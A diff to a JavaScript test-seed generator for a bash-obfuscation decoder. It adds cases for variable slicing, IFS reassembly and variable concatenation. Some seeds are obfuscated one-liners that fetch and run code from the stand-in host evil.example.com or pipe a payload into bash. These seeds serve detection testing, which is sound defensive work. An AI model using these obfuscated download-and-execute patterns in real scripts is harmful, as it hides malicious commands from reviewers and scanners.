@@ -8,6 +8,7 @@
 // ════════════════════════════════════════════════════════════════════════════
 
 const BASH_TECHNIQUE_CATALOG = Object.freeze([
+  'Bash Variable Expansion (single)',
   'Bash Variable Expansion (line)',
   'Bash Variable Expansion (partial)',
   'Bash ANSI-C Quoting',
@@ -51,12 +52,12 @@ function genVariableExpansion() {
   // B1 — ${V:n:m}, ${V//x/y}, ${V/#prefix/}, ${V:-default}, ${V/%suffix/}
   // The decoder resolves these against earlier V=… literal assignments.
   const out = [];
-  // Simple substring slicing
+  // Simple substring slicing — single fragment, emits "(single)".
   out.push(makeSeed(
     'V=powershell_is_long\necho ${V:0:10}',
     'powershell',
   ));
-  // Global substitution
+  // Global substitution — single fragment.
   out.push(makeSeed(
     'X=aXbXcXwhoamiXdX\necho ${X//X/}',
     'whoami',
@@ -76,6 +77,35 @@ function genVariableExpansion() {
     'unset CMD\necho ${CMD:-wget}',
     'wget',
   ));
+
+  // ── Line-level multi-fragment (≥3 ${V:n:m} on one line) ──
+  //
+  // The decoder's line-level resolver (bash-obfuscation.js:293
+  // `fragLineRe`) fires on ≥3 adjacent slice-expansions on a single
+  // line. Each slice alone is gibberish; the joined line spells out a
+  // sensitive command. Indices into V='curl http://evil.example.com':
+  //   0=c 1=u 2=r 3=l 4=' ' 5=h 6=t 7=t 8=p
+  out.push(makeSeed(
+    "V='curl http://evil.example.com'\n"
+    + 'eval ${V:0:1}${V:1:1}${V:2:1}${V:3:1}',
+    'curl',
+  ));
+  // "(line)" variant — every fragment resolves.
+  out.push(makeSeed(
+    "W='wget -qO- http://evil.example.com/x.sh'\n"
+    + '${W:0:1}${W:1:1}${W:2:1}${W:3:1} ${W:5:}',
+    'wget',
+  ));
+  // "(partial)" variant — at least one fragment references an
+  // undefined variable. The resolver tolerates partial resolution
+  // provided ≥1 fragment does resolve; emits "(partial)" when any
+  // are unresolved.
+  out.push(makeSeed(
+    "S='sh /tmp/payload'\n"
+    + '${S:0:1}${S:1:1}${UNDEF:0:1}${S:2:1} | bash',
+    'sh',
+  ));
+
   return out;
 }
 
@@ -161,26 +191,60 @@ function genEvalUnroll() {
 function genIfsAndConcat() {
   // B6 — IFS / brace-expansion fragmentation, {l,s}=…; $l$s
   const out = [];
-  // IFS=… abuse — structural recognition even if we can't fully resolve
+
+  // ── "Bash IFS Reassembly" — resolved form (var IS assigned). ──
+  // decoder (bash-obfuscation.js:577 `ifsExecRe`) requires:
+  //   IFS=<quoted|$'…'|"…">;  …; eval $V   (within 800 chars)
+  // and the var is in the local `vars` symbol table → "Bash IFS
+  // Reassembly".
   out.push(makeSeed(
-    'IFS=_;cmd=wget_-qO-_http://evil.example.com/x;$cmd',
+    `IFS='_'\ncmd=wget_-qO-_http://evil.example.com/x\neval $cmd`,
     'wget',
   ));
-  // Variable concat: l=who; a=ami; $l$a
+  // Tab-separated IFS (ANSI-C $'\t'), resolved var.
   out.push(makeSeed(
-    'l=who; a=ami; $l$a',
+    `IFS=$'\\x09'\nc='curl\\t-sSL\\thttps://e.example'\neval $c`,
+    'curl',
+  ));
+
+  // ── "Bash IFS Reassembly (structural)" — UNRESOLVED var. ──
+  // Same regex matches when the downstream var is NOT in the symbol
+  // table; decoder falls to the structural arm. Single high-
+  // confidence signal regardless of payload resolution.
+  out.push(makeSeed(
+    `IFS='_'\n# the assignment for \$PAYLOAD happens upstream\neval $PAYLOAD`,
+    'IFS-reassembly invoking $PAYLOAD',
+  ));
+  out.push(makeSeed(
+    `IFS=$'\\x0a'\nexec $MYSTERY_CMD`,
+    'IFS-reassembly invoking $MYSTERY_CMD',
+  ));
+
+  // ── "Bash Variable Concatenation" — all resolved. ──
+  // l=who; a=ami; $l$a  (but must be ≥3 vars per decoder's {3,12} cap
+  // so add a third):
+  out.push(makeSeed(
+    'a=who\nb=am\nc=i\n$a$b$c',
     'whoami',
   ));
-  // Partial (unresolved) concat
+  // Three-way concat spelling 'powershell'.
   out.push(makeSeed(
-    'a=cu; echo $a$UNDEFINED_B$UNDEFINED_C',
-    'cu',
-  ));
-  // Three-way concat
-  out.push(makeSeed(
-    'p=pow; q=er; r=shell; $p$q$r',
+    'p=pow\nq=er\nr=shell\n$p$q$r',
     'powershell',
   ));
+
+  // ── "Bash Variable Concatenation (partial)" — at least one ──
+  // concatenated var is undefined. Decoder sets `unresolved > 0`
+  // → "(partial)" branch.
+  out.push(makeSeed(
+    'a=cu\nb=rl\n$a$b$UNDEFINED_C$UNDEFINED_D  # must still hit SENSITIVE list',
+    'cu',
+  ));
+  out.push(makeSeed(
+    'x=po\ny=wer\n$x$y$UNDEFINED_SHELL$UNDEFINED_END  # partial => powerwer⟨…⟩',
+    'pow',
+  ));
+
   return out;
 }
 
